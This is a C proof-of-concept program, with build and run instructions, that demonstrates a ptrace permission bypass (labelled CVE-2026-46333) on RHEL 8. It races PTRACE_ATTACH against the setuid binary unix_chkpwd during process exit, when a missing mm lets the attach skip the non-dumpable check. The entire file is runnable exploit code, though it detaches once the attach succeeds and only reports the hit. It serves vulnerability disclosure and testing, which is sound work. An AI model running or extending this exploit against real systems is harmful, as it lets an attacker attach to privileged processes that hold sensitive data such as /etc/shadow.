/*
 * ptrace_mm_null.c — Demonstrate the mm-NULL ptrace bypass on RHEL 8
 * using a real setuid binary (unix_chkpwd). (CVE-2026-46333)
 *
 * unix_chkpwd is setuid root.  It opens /etc/shadow, then calls
 * setuid(getuid()) to drop privileges before reading a password
 * from stdin.  After the drop the process is non-dumpable but its
 * uid/euid/suid all match the caller, so the credential check in
 * __ptrace_may_access() passes.  The only remaining gate is the
 * dumpable check — which is skipped when task->mm == NULL.
 *
 * Build & run:
 *   gcc -O2 -o ptrace_mm_null ptrace_mm_null.c
 *   ./ptrace_mm_null
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>

#define TARGET  "/usr/sbin/unix_chkpwd"
#define ROUNDS  50000

static long now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000000L + ts.tv_nsec / 1000;
}

int main(void)
{
	struct stat st;
	if (stat(TARGET, &st) < 0 || !(st.st_mode & S_ISUID)) {
		fprintf(stderr, TARGET ": not setuid or missing\n");
		return 1;
	}

	fprintf(stderr, "target: " TARGET "\n"
		"racing ptrace(PTRACE_ATTACH) x %d rounds ...\n", ROUNDS);

	long t0 = now_us();
	int round;

	for (round = 0; round < ROUNDS; round++) {
		int pfd[2];
		if (pipe(pfd) < 0) {
			perror("pipe");
			return 1;
		}

		/*
		 * Sync pipe: write end is O_CLOEXEC, so it auto-closes
		 * when execl() succeeds.  Parent reads from efd[0] —
		 * EOF means exec happened.
		 */
		int efd[2];
		if (pipe(efd) < 0) {
			perror("pipe");
			return 1;
		}
		if (fcntl(efd[1], F_SETFD, FD_CLOEXEC) < 0) {
			perror("fcntl");
			return 1;
		}

		pid_t c = fork();
		if (c < 0) {
			perror("fork");
			return 1;
		}
		if (c == 0) {
			close(pfd[1]);
			close(efd[0]);
			dup2(pfd[0], STDIN_FILENO);
			close(pfd[0]);
			int dn = open("/dev/null", O_WRONLY);
			if (dn >= 0) {
				dup2(dn, STDOUT_FILENO);
				dup2(dn, STDERR_FILENO);
				close(dn);
			}
			execl(TARGET, TARGET, "root", "chkexpiry",
			      (char *)NULL);
			_exit(127);
		}
		close(pfd[0]);
		close(efd[1]);

		/* Block until execl() succeeds (EOF on sync pipe). */
		char dummy;
		while (read(efd[0], &dummy, 1) > 0)
			;
		close(efd[0]);

		/* EOF on stdin → unix_chkpwd exits. */
		close(pfd[1]);

		/* Race the mm-NULL window in do_exit(). */
		int a, hit = 0;
		for (a = 0; a < 500000; a++) {
			if (ptrace(PTRACE_ATTACH, c, NULL, NULL) == 0) {
				fprintf(stderr,
					"  round %d: PTRACE_ATTACH "
					"succeeded (try %d, +%ld ms)\n",
					round, a,
					(now_us() - t0) / 1000);
				hit = 1;
				break;
			}
			if (errno == ESRCH)
				break;
			if ((a & 0x3ff) == 0x3ff &&
			    waitpid(c, NULL, WNOHANG) > 0) {
				c = 0;
				break;
			}
		}

		if (c > 0) {
			if (hit)
				ptrace(PTRACE_DETACH, c, NULL, NULL);
			waitpid(c, NULL, 0);
		}

		if (hit) {
			fprintf(stderr,
				"\nBug: ptrace attached to non-dumpable "
				"setuid process during mm-NULL window.\n"
				"__ptrace_may_access() skips the dumpable "
				"check when task->mm == NULL.\n");
			return 0;
		}
	}

	fprintf(stderr, "no hit in %d rounds (%ld ms)\n",
		ROUNDS, (now_us() - t0) / 1000);
	return 1;
}
